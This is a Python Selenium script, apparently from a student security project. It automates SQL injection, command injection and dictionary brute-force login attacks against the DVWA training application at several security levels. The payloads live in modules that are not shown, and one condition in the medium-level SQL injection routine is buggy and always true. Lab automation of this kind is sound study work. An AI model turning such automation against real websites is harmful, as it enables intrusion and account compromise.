# -*- coding: utf-8 -*-
"""
Created on Tue Nov  1 14:00:06 2022

@author: Callum Manning

Strath Uni - 201720173
"""
#My Modules
from UserSetUp import *
from ExtModulesSetUp import *
from StatementGen import *
from passCracker import *

def openBrowser():
    try:
        if BROWSER_CHOICE == 1:
            ChromeOptions = CHROME_Opt()
            ChromeOptions.headless = HIDE_BROWSER 
            return webdriver.Chrome(CHROME_LOC, chrome_options=ChromeOptions)
        elif BROWSER_CHOICE == 0:
            FireFoxoptions = FIREFOX_Opt()
            FireFoxoptions.headless = HIDE_BROWSER
            return webdriver.Firefox(executable_path =FIREFOX_LOC, options=FireFoxoptions)
    except:
        print(BROWSER_CHOICE_ERROR)

def elemPresenceCheck_XPATH(browser, XPATH):
    try:
        return browser.find_element(By.XPATH, XPATH)

    except:
        return False

def getElem(browser, elementID, FindingMethod):
    try:
        if FindingMethod == 0:
            return browser.find_element(By.NAME, elementID)
        elif FindingMethod == 1:
            return browser.find_element(By.XPATH, elementID)
        elif FindingMethod == 2:
            return browser.find_element(By.TAG_NAME, elementID)
    except:
         print(GET_ELEM_ERROR + str(elementID))


def sendInfo(elem, Info):
    try:
        elem.send_keys(Info)    
    except:
         print(SEND_INFO_ERROR +  str(elem))

        
def sendInfoReturn(elem, Info):
    try:
        elem.send_keys(Info + Keys.RETURN)    
    except:
         print(SEND_INFO_ERROR +  str(elem))

        
        
def waitForLoad(browser, elementID,FindingMethod):   
    wait  = WebDriverWait(browser,30) 
    try:
        if FindingMethod == 0:
            wait.until(EC.element_to_be_clickable((By.NAME, elementID)))
        elif FindingMethod == 1:
            wait.until(EC.element_to_be_clickable((By.XPATH, elementID)))
    except:
        print(WAIT_FOR_ELEM_ERROR + str(elementID))


def executeBrowserScript(browserInput, browser, elem):
    try:
        browser.execute_script(browserInput, elem)
    except:
        print(SCRIPT_EXECUTION_ERROR + str(browserInput))

        
        
def clickLink_XPATH(browser, XPATH):
    waitForLoad(browser,XPATH,1)
    elem = getElem(browser,XPATH,1)
    elem.click()

def jumpToSecondPage(browser):
    main_page = browser.current_window_handle
    for handle in browser.window_handles:
        if handle != main_page:
            secondPage = handle
    browser.switch_to.window(secondPage)
    return main_page

def loginDVWA(browser):
    if browser.current_url == LOGIN:
        elem = getElem(browser,LOGIN_UNAME_BOX_ID,  0)
        sendInfo(elem, DVWAUSER)
        elem = getElem(browser,LOGIN_PASS_BOX_ID,  0)
        sendInfoReturn(elem, DVWAPASS)
    else: 
        print(LOG_IN_PAGE_ERROR)

def changeSecurity(browser, securityLevel):
    clickLink_XPATH(browser, DVWA_SECURITY_XPATH)
    elem = Select(getElem(browser, DVWA_SECURITY_DROP_ID, 0))
    elem.select_by_visible_text(securityLevel) 
    elem = getElem(browser, DVWA_SECURITY_SUBMIT_ID, 0)
    elem.click()

#SQL INJECTION ATTACKS     
def SQLI_LOW_LEVEL(browser):
    elem = getElem(browser,SQL_I_INSERT_BOX_ID,  0)
    if USE_GENERATED_ATTACKS:
        sendInfoReturn(elem, sqliStatementGenerator(True)) 
    else:
        sendInfoReturn(elem, SQLI_ATTACK_DEFAULT)   

def SQLI_MID_LEVEL(browser):
    elem = getElem(browser,SQL_I_INSERT_BOX_ID,  0)
    input_list = getElem(elem, SQL_I_DROP_ID, 2)
    if USE_GENERATED_ATTACKS:
        attack = sqliStatementGenerator(False)
        if '"' or "%" in attack: 
            attack = " ".join(attack.split(' ')[2:])
        executeBrowserScript((OPTION_INJECT[0] + attack + OPTION_INJECT[1]), browser, input_list)
    else:
        executeBrowserScript(SQLI_OPTION_INJECT_DEFAULT, browser, input_list)
    elem = getElem(browser,SUBMIT_BUTTON_ID,  0)
    elem.click()

def SQLI_HIGH_LEVEL(browser):
    clickLink_XPATH(browser, HIGH_SECURITY_SQLINJECTLINK)
    main_page = jumpToSecondPage(browser)
    SQLI_LOW_LEVEL(browser)  
    browser.close()
    browser.switch_to.window(main_page)

    
#COMMAND INJECTION ATTACKS
def COMSI_LOW_LEVEL(browser):
    elem = getElem(browser,COMS_I_INSERT_BOX_IP,  0)
    if USE_GENERATED_ATTACKS:
        sendInfoReturn(elem, comiStatementGenerator(1)) 
    else:
        sendInfoReturn(elem, COMSI_ATTACK_DEFAULT)  


def COMSI_MID_LEVEL(browser):
    elem = getElem(browser,COMS_I_INSERT_BOX_IP,  0)
    if USE_GENERATED_ATTACKS:
        sendInfoReturn(elem, comiStatementGenerator(2)) 
    else:
        sendInfoReturn(elem, COMSI_ATTACK_DEFAULT) 


def COMSI_HIGH_LEVEL(browser):
    elem = getElem(browser,COMS_I_INSERT_BOX_IP,  0)
    if USE_GENERATED_ATTACKS:
        sendInfoReturn(elem, comiStatementGenerator(3)) 
    else:
        sendInfoReturn(elem, COMSI_ATTACK_DEFAULT) 
        
def BRUTE_FORCE_ATTACK(browser, passFail, sleepTime):
    if RANDOM_START_BRUTE_FORCE and passFail:
        i = random.randint(50, 98)
    elif RANDOM_START_BRUTE_FORCE and not passFail:
        i = random.randint(95, 98)
    else:
        i = 0;
    if passFail: 
        maxI = len(PassDic);
    else:
        maxI = 98
    Found = False
    while  Found == False and i<maxI:
        time.sleep(sleepTime)
        elem = getElem(browser,LOGIN_UNAME_BOX_ID,  0)
        sendInfo(elem, DVWAUSER)
        elem = getElem(browser,LOGIN_PASS_BOX_ID,  0)
        sendInfoReturn(elem, PassCracker(i, PassDic))
        if elemPresenceCheck_XPATH(browser, BRUTE_FORCE_PASS_XPATH) != False:
            Found = True
            print('Password is found, it is -  ' + PassCracker(i-1, PassDic))
        else:
            i = i + 1;
    if i==maxI and Found == False:
        print('Password not found')
            
    
    
    
